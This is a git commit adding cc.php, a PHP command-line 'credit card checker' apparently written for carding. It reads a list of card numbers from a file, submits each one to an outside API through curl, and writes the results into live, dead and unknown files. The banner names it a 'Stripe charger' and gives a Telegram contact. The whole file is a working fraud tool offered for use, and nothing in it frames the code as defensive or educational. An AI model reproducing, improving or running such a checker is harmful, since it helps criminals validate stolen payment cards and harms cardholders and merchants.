4035884b645b33561a03c1dc766a94bb9c825d4c
TGR <106729571+TGR8@users.noreply.github.com>
2023-05-31 14:52:41 +0300

    Add files via upload

---
+++ cc.php
@@ -0,0 +1,118 @@
+<?php
+
+// DONT CHANGE THIS
+
+/*  ================[INFO]================
+ *   AUTHOR  : "TGR#0737"
+ *   SCRIPT    : CREDIT CARD CHECKER
+ *   Telegram : https://t.me/lovingcash
+ *   VERSION : 1.1 (CLI) ======================================
+ */
+
+//SETTING 
+
+ini_set("memory_limit", '-1');
+date_default_timezone_set("Asia/Jakarta");
+define("OS", strtolower(PHP_OS));
+
+$date = date("l, d-m-Y");
+
+//BANNER
+
+system("clear");
+echo banner();
+
+//INPUT LIST
+
+enterlist:
+echo "\n[+] Enter your list (eg: list.txt) >> ";
+$listname = trim(fgets(STDIN));
+if(empty($listname) || !file_exists($listname)) {
+	echo " [!] Your list was not found [!]".PHP_EOL;
+	goto enterlist;
+}
+$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));
+
+echo "[?] Continue? (Y/n) >> ";
+$q = trim(fgets(STDIN));
+$que = strtolower($q);
+if($que == 'n') exit("\n[!] You sure!? [!]\n\n");
+
+//COUNT
+
+$l = 0;
+$d = 0;
+$e = 0;
+$u = 0;
+$no = 0;
+$total = count($lists);
+echo "\n[+] TOTAL $total lists [+]\n\n";
+
+//LOOPING
+
+foreach ($lists as $list) {
+     $no++;
+     //API
+     $url = "https://api.banditcoding.xyz/cc/v1/?cc=$list";
+     
+     //CURL
+     
+     $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+     $res = curl_exec($ch);
+     curl_close($ch);
+     
+     //RESPONSE
+     
+     if(strpos($res, '"status":"success"')){
+         $l++;
+         file_put_contents("result/live.txt", $list.PHP_EOL, FILE_APPEND);
+         echo "[$no/$total] LIVE | $list | CREDIT CARD CHECKER \n";
+     }elseif(strpos($res, '"status":"failed"')){
+         $d++;
+         file_put_contents("result/die.txt", $list.PHP_EOL, FILE_APPEND);
+         echo "[$no/$total] DIE | $list | CREDIT CARD CHECKER \n";
+     }elseif(strpos($res, '"status":"error"')){
+         $u++;
+         file_put_contents("result/unknown.txt", $list.PHP_EOL, FILE_APPEND);
+         echo "[$no/$total] UNKNOWN | $list | CREDIT CARD CHECKER \n";
+     }elseif(strpos($res, "The server is temporarily busy, try again later!")){
+         $e++;
+         file_put_contents("result/error.txt", $list.PHP_EOL, FILE_APPEND);
+         echo "[x] !!!SERVER BUSY!!! [x]\n";
+     }else{
+         $e++;
+         file_put_contents("result/error.txt", $list.PHP_EOL, FILE_APPEND);
+         echo "[x] ERROR CONNECTION [x]\n";
+     }
+}
+
+//END
+
+echo "
+DATE : $date
+==========[INFO]==========
+  TOTAL LIST : $total
+  LIVE : $l
+  DIE : $d
+  UNKNOWN : $u
+  ERROR : $e 
+==========================
+     THANKS FOR USING WILDCARD
+";
+
+function banner(){
+    $banner = "
+\¯¯\     /¯¯/    O    |¯¯¯¯|  '  |¯¯¯¯\°'  /¯¯¯¯\     /¯¯¯¯¯| |¯¯¯¯\  |¯¯¯¯\°' 
+  \   \/\/   /   |¯¯¯¯| |       |__ |  x     \ |   (\__/|  /     !     | |   x  <|'|  x     \ 
+    \_/\_/   '  |____| |______| |_____/  \____\ /___/¯|__'| |__|\__\|_____/ 
+------------------------------------------------------
+  AUTHOR  : "TGR#0737"
+  VERSION : 1.1
+  SCRIPT    : CREDIT CARD CHECKER STRIPE CHARGER
+------------------------------------------------------
+";
+    return $banner;
+}
